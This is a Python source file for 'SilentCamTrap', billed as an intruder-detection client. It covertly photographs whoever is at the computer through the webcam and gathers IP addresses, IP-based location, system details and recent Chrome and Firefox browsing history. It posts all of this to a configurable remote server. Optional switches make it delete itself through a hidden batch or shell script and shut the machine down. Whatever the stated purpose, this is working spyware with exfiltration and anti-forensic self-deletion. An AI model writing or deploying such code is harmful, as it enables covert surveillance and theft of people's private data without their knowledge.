#!/usr/bin/env python3
"""
SilentCamTrap - Intruder Detection Client
==========================================
A comprehensive security monitoring tool that captures intruder data
including webcam images, system information, and browser history.

Author: Mahmud Rahman (https://github.com/mahmud-r-farhan)
License: MIT
"""

import cv2
import os
import sys
import time
import json
import socket
import sqlite3
import logging
import platform
import subprocess
import configparser
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass, asdict
from typing import Dict, List, Optional, Any
from contextlib import contextmanager

try:
    import requests
    import geocoder
except ImportError as e:
    print(f"Missing required package: {e}")
    print("Install with: pip install requests geocoder opencv-python")
    sys.exit(1)


# =============================================================================
# Configuration
# =============================================================================

@dataclass
class Config:
    """Application configuration settings."""
    api_url: str = 'http://localhost:3000/api/upload'
    log_folder: str = 'intruder_logs'
    webcam_index: int = 0
    webcam_warmup_seconds: float = 0.5
    connection_timeout: int = 30
    enable_shutdown: bool = False  # Safety: disabled by default
    enable_self_delete: bool = False  # Safety: disabled by default
    enable_browser_history: bool = True
    max_browser_history: int = 10
    log_level: str = 'INFO'
    
    @classmethod
    def from_file(cls, config_path: str = 'config.json') -> 'Config':
        """Load configuration from JSON file if exists."""
        config = cls()
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    data = json.load(f)
                    for key, value in data.items():
                        if hasattr(config, key):
                            setattr(config, key, value)
            except Exception as e:
                logging.warning(f"Failed to load config: {e}")
        return config
    
    def to_file(self, config_path: str = 'config.json') -> None:
        """Save configuration to JSON file."""
        with open(config_path, 'w') as f:
            json.dump(asdict(self), f, indent=2)


# =============================================================================
# Logging Setup
# =============================================================================

def setup_logging(config: Config) -> logging.Logger:
    """Configure application logging."""
    log_format = '%(asctime)s - %(levelname)s - %(message)s'
    logging.basicConfig(
        level=getattr(logging, config.log_level.upper()),
        format=log_format,
        handlers=[
            logging.StreamHandler(sys.stdout),
            logging.FileHandler(
                os.path.join(config.log_folder, 'client.log'),
                mode='a'
            )
        ]
    )
    return logging.getLogger(__name__)


# =============================================================================
# Data Collection Classes
# =============================================================================

@dataclass
class LocationData:
    """Geographic location information."""
    latitude: Optional[float] = None
    longitude: Optional[float] = None
    city: Optional[str] = None
    country: Optional[str] = None
    error: Optional[str] = None


@dataclass
class NetworkData:
    """Network information."""
    public_ip: str = ""
    local_ip: str = ""
    hostname: str = ""
    error: Optional[str] = None


@dataclass
class SystemData:
    """System information."""
    os_name: str = ""
    os_version: str = ""
    machine: str = ""
    processor: str = ""
    python_version: str = ""


@dataclass
class BrowserHistoryEntry:
    """Single browser history entry."""
    url: str
    title: Optional[str]
    timestamp: Optional[int]


@dataclass
class IntruderData:
    """Complete intruder data package."""
    capture_time: str
    network: NetworkData
    location: LocationData
    system: SystemData
    browser_histories: Dict[str, Any]
    image_path: Optional[str] = None


# =============================================================================
# Data Collectors
# =============================================================================

class NetworkCollector:
    """Collects network-related information."""
    
    @staticmethod
    def get_public_ip(timeout: int = 10) -> str:
        """Get public IP address using multiple fallback services."""
        services = [
            'https://api.ipify.org',
            'https://icanhazip.com',
            'https://checkip.amazonaws.com',
            'https://api.my-ip.io/ip'
        ]
        
        for service in services:
            try:
                response = requests.get(service, timeout=timeout)
                if response.status_code == 200:
                    return response.text.strip()
            except requests.RequestException:
                continue
        return "Unknown"
    
    @staticmethod
    def get_local_ip() -> str:
        """Get local network IP address."""
        try:
            # Create a socket to determine local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            try:
                return socket.gethostbyname(socket.gethostname())
            except Exception:
                return "Unknown"
    
    @staticmethod
    def get_hostname() -> str:
        """Get system hostname."""
        try:
            return socket.gethostname()
        except Exception:
            return "Unknown"
    
    @classmethod
    def collect(cls, timeout: int = 10) -> NetworkData:
        """Collect all network data."""
        return NetworkData(
            public_ip=cls.get_public_ip(timeout),
            local_ip=cls.get_local_ip(),
            hostname=cls.get_hostname()
        )


class LocationCollector:
    """Collects geographic location information."""
    
    @staticmethod
    def collect() -> LocationData:
        """Get approximate location from IP address."""
        try:
            g = geocoder.ip('me')
            if g.ok:
                return LocationData(
                    latitude=g.lat,
                    longitude=g.lng,
                    city=g.city,
                    country=g.country
                )
            return LocationData(error="Unable to determine location")
        except Exception as e:
            return LocationData(error=str(e))


class SystemCollector:
    """Collects system information."""
    
    @staticmethod
    def collect() -> SystemData:
        """Gather system information."""
        return SystemData(
            os_name=platform.system(),
            os_version=platform.release(),
            machine=platform.machine(),
            processor=platform.processor(),
            python_version=platform.python_version()
        )


class BrowserHistoryCollector:
    """Collects browser history from Chrome and Firefox."""
    
    def __init__(self, max_entries: int = 10):
        self.max_entries = max_entries
        self.is_windows = platform.system() == 'Windows'
    
    @contextmanager
    def _temp_db_copy(self, source_path: str, temp_name: str):
        """Context manager for safely copying and cleaning up database files."""
        temp_path = temp_name
        try:
            if os.path.exists(source_path):
                with open(source_path, 'rb') as src, open(temp_path, 'wb') as dst:
                    dst.write(src.read())
                yield temp_path
            else:
                yield None
        finally:
            if os.path.exists(temp_path):
                try:
                    os.remove(temp_path)
                except Exception:
                    pass
    
    def _get_chrome_path(self) -> str:
        """Get Chrome history database path based on OS."""
        if self.is_windows:
            return os.path.expanduser(
                r'~\AppData\Local\Google\Chrome\User Data\Default\History'
            )
        elif platform.system() == 'Darwin':  # macOS
            return os.path.expanduser(
                '~/Library/Application Support/Google/Chrome/Default/History'
            )
        else:  # Linux
            return os.path.expanduser(
                '~/.config/google-chrome/Default/History'
            )
    
    def _get_firefox_profile_path(self) -> Optional[str]:
        """Get Firefox profile path based on OS."""
        if self.is_windows:
            base = os.path.expanduser(r'~\AppData\Roaming\Mozilla\Firefox')
        elif platform.system() == 'Darwin':
            base = os.path.expanduser('~/Library/Application Support/Firefox')
        else:
            base = os.path.expanduser('~/.mozilla/firefox')
        
        profiles_ini = os.path.join(base, 'profiles.ini')
        
        if not os.path.exists(profiles_ini):
            return None
        
        config = configparser.ConfigParser()
        config.read(profiles_ini)
        
        for section in config.sections():
            if config.has_option(section, 'Default') and config.get(section, 'Default') == '1':
                profile_path = config.get(section, 'Path')
                if config.has_option(section, 'IsRelative') and config.get(section, 'IsRelative') == '1':
                    return os.path.join(base, profile_path, 'places.sqlite')
                return os.path.join(profile_path, 'places.sqlite')
        
        # Fallback: try first Profile section
        for section in config.sections():
            if section.startswith('Profile'):
                profile_path = config.get(section, 'Path', fallback=None)
                if profile_path:
                    if config.has_option(section, 'IsRelative') and config.get(section, 'IsRelative') == '1':
                        return os.path.join(base, profile_path, 'places.sqlite')
                    return os.path.join(profile_path, 'places.sqlite')
        
        return None
    
    def collect_chrome(self) -> Dict[str, Any]:
        """Collect Chrome browser history."""
        try:
            chrome_path = self._get_chrome_path()
            
            with self._temp_db_copy(chrome_path, 'temp_chrome_history.db') as temp_db:
                if not temp_db:
                    return {'error': 'Chrome history database not found'}
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT url, title, last_visit_time 
                    FROM urls 
                    ORDER BY last_visit_time DESC 
                    LIMIT ?
                """, (self.max_entries,))
                
                history = [
                    asdict(BrowserHistoryEntry(
                        url=row[0],
                        title=row[1],
                        timestamp=row[2]
                    ))
                    for row in cursor.fetchall()
                ]
                conn.close()
                return history if history else {'info': 'No Chrome history found'}
                
        except sqlite3.OperationalError as e:
            return {'error': f'Chrome database locked or corrupted: {e}'}
        except Exception as e:
            return {'error': str(e)}
    
    def collect_firefox(self) -> Dict[str, Any]:
        """Collect Firefox browser history."""
        try:
            firefox_path = self._get_firefox_profile_path()
            
            if not firefox_path:
                return {'error': 'Firefox profile not found'}
            
            with self._temp_db_copy(firefox_path, 'temp_firefox_history.db') as temp_db:
                if not temp_db:
                    return {'error': 'Firefox history database not found'}
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT url, title, last_visit_date 
                    FROM moz_places 
                    WHERE last_visit_date IS NOT NULL
                    ORDER BY last_visit_date DESC 
                    LIMIT ?
                """, (self.max_entries,))
                
                history = [
                    asdict(BrowserHistoryEntry(
                        url=row[0],
                        title=row[1],
                        timestamp=row[2]
                    ))
                    for row in cursor.fetchall()
                ]
                conn.close()
                return history if history else {'info': 'No Firefox history found'}
                
        except sqlite3.OperationalError as e:
            return {'error': f'Firefox database locked or corrupted: {e}'}
        except Exception as e:
            return {'error': str(e)}
    
    def collect_all(self) -> Dict[str, Any]:
        """Collect history from all supported browsers."""
        return {
            'chrome': self.collect_chrome(),
            'firefox': self.collect_firefox()
        }


# =============================================================================
# Webcam Capture
# =============================================================================

class WebcamCapture:
    """Handles webcam image capture."""
    
    def __init__(self, camera_index: int = 0, warmup_time: float = 0.5):
        self.camera_index = camera_index
        self.warmup_time = warmup_time
        self.cap = None
    
    def __enter__(self):
        self.cap = cv2.VideoCapture(self.camera_index)
        if self.cap.isOpened():
            # Allow camera to warm up
            time.sleep(self.warmup_time)
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.cap:
            self.cap.release()
    
    def capture(self) -> Optional[Any]:
        """Capture a single frame from the webcam."""
        if not self.cap or not self.cap.isOpened():
            return None
        
        # Read multiple frames to get a stable image
        for _ in range(5):
            ret, frame = self.cap.read()
        
        if ret:
            return frame
        return None
    
    def save_image(self, frame: Any, output_dir: str) -> Optional[str]:
        """Save captured frame to file."""
        if frame is None:
            return None
        
        os.makedirs(output_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(output_dir, f"intruder_{timestamp}.jpg")
        
        # Save with high quality
        cv2.imwrite(filename, frame, [cv2.IMWRITE_JPEG_QUALITY, 95])
        return filename


# =============================================================================
# Data Sender
# =============================================================================

class DataSender:
    """Handles sending collected data to the server."""
    
    def __init__(self, api_url: str, timeout: int = 30):
        self.api_url = api_url
        self.timeout = timeout
    
    def send(self, image_path: str, data: Dict[str, Any]) -> bool:
        """Send image and data to the server."""
        try:
            with open(image_path, 'rb') as image_file:
                files = {
                    'file': (os.path.basename(image_path), image_file, 'image/jpeg'),
                    'data': ('data.json', json.dumps(data), 'application/json')
                }
                
                response = requests.post(
                    self.api_url,
                    files=files,
                    timeout=self.timeout
                )
                
                return response.status_code == 200
                
        except requests.ConnectionError:
            logging.error(f"Connection failed to {self.api_url}")
            return False
        except requests.Timeout:
            logging.error("Request timed out")
            return False
        except Exception as e:
            logging.error(f"Failed to send data: {e}")
            return False


# =============================================================================
# Post-Success Actions
# =============================================================================

class PostSuccessActions:
    """Handles actions after successful data transmission."""
    
    def __init__(self, enable_shutdown: bool = False, enable_self_delete: bool = False):
        self.enable_shutdown = enable_shutdown
        self.enable_self_delete = enable_self_delete
        self.is_windows = platform.system() == 'Windows'
    
    def execute(self) -> None:
        """Execute post-success actions."""
        if self.enable_self_delete:
            self._schedule_self_delete()
        
        if self.enable_shutdown:
            self._schedule_shutdown()
    
    def _schedule_self_delete(self) -> None:
        """Schedule deletion of the executable."""
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        
        if self.is_windows:
            self._windows_self_delete(exe_path)
        else:
            self._unix_self_delete(exe_path)
    
    def _windows_self_delete(self, exe_path: str) -> None:
        """Windows-specific self-deletion using batch file."""
        bat_path = os.path.join(os.path.dirname(exe_path), 'cleanup.bat')
        
        script_content = f'''@echo off
timeout /t 3 /nobreak >nul
del /f /q "{exe_path}"
del /f /q "{bat_path}"
'''
        
        with open(bat_path, 'w') as f:
            f.write(script_content)
        
        subprocess.Popen(
            ['cmd', '/c', bat_path],
            shell=False,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    
    def _unix_self_delete(self, exe_path: str) -> None:
        """Unix-specific self-deletion using shell script."""
        sh_path = os.path.join(os.path.dirname(exe_path), 'cleanup.sh')
        
        script_content = f'''#!/bin/bash
sleep 3
rm -f "{exe_path}"
rm -f "{sh_path}"
'''
        
        with open(sh_path, 'w') as f:
            f.write(script_content)
        
        os.chmod(sh_path, 0o755)
        subprocess.Popen(['sh', sh_path], shell=False)
    
    def _schedule_shutdown(self) -> None:
        """Schedule system shutdown."""
        if self.is_windows:
            subprocess.Popen(['shutdown', '/s', '/t', '5'], shell=False)
        else:
            subprocess.Popen(['shutdown', '-h', '+1'], shell=False)


# =============================================================================
# Main Application
# =============================================================================

class SilentCamTrap:
    """Main application orchestrator."""
    
    def __init__(self, config: Config):
        self.config = config
        self.logger = setup_logging(config)
    
    def collect_all_data(self) -> IntruderData:
        """Collect all intruder data."""
        self.logger.info("Starting data collection...")
        
        # Collect network data
        self.logger.debug("Collecting network data...")
        network = NetworkCollector.collect(self.config.connection_timeout)
        
        # Collect location data
        self.logger.debug("Collecting location data...")
        location = LocationCollector.collect()
        
        # Collect system data
        self.logger.debug("Collecting system data...")
        system_info = SystemCollector.collect()
        
        # Collect browser history
        browser_histories = {}
        if self.config.enable_browser_history:
            self.logger.debug("Collecting browser history...")
            collector = BrowserHistoryCollector(self.config.max_browser_history)
            browser_histories = collector.collect_all()
        
        return IntruderData(
            capture_time=datetime.now().isoformat(),
            network=network,
            location=location,
            system=system_info,
            browser_histories=browser_histories
        )
    
    def capture_image(self) -> Optional[str]:
        """Capture webcam image."""
        self.logger.info("Capturing webcam image...")
        
        with WebcamCapture(
            self.config.webcam_index,
            self.config.webcam_warmup_seconds
        ) as webcam:
            frame = webcam.capture()
            
            if frame is None:
                self.logger.error("Failed to capture webcam image")
                return None
            
            image_path = webcam.save_image(frame, self.config.log_folder)
            
            if image_path:
                self.logger.info(f"Image saved: {image_path}")
            
            return image_path
    
    def run(self) -> bool:
        """Execute the main application workflow."""
        try:
            # Ensure log folder exists
            os.makedirs(self.config.log_folder, exist_ok=True)
            
            # Capture image
            image_path = self.capture_image()
            if not image_path:
                self.logger.error("Image capture failed. Aborting.")
                return False
            
            # Collect data
            data = self.collect_all_data()
            data.image_path = image_path
            
            # Convert to dictionary for sending
            data_dict = {
                'capture_time': data.capture_time,
                'network': asdict(data.network),
                'location': asdict(data.location),
                'system': asdict(data.system),
                'browser_histories': data.browser_histories
            }
            
            # Send data to server
            self.logger.info("Sending data to server...")
            sender = DataSender(self.config.api_url, self.config.connection_timeout)
            
            if sender.send(image_path, data_dict):
                self.logger.info("Data sent successfully!")
                
                # Execute post-success actions
                actions = PostSuccessActions(
                    self.config.enable_shutdown,
                    self.config.enable_self_delete
                )
                actions.execute()
                
                return True
            else:
                self.logger.error("Failed to send data to server")
                return False
                
        except Exception as e:
            self.logger.exception(f"Application error: {e}")
            return False


# =============================================================================
# Entry Point
# =============================================================================

def main():
    """Application entry point."""
    # Load configuration
    config = Config.from_file()
    
    # Override with environment variables if present
    if os.environ.get('SILENTCAMTRAP_API_URL'):
        config.api_url = os.environ['SILENTCAMTRAP_API_URL']
    if os.environ.get('SILENTCAMTRAP_ENABLE_SHUTDOWN'):
        config.enable_shutdown = os.environ['SILENTCAMTRAP_ENABLE_SHUTDOWN'].lower() == 'true'
    if os.environ.get('SILENTCAMTRAP_ENABLE_DELETE'):
        config.enable_self_delete = os.environ['SILENTCAMTRAP_ENABLE_DELETE'].lower() == 'true'
    
    # Run application
    app = SilentCamTrap(config)
    success = app.run()
    
    # Small delay before exit
    time.sleep(1)
    
    sys.exit(0 if success else 1)


if __name__ == '__main__':
    main()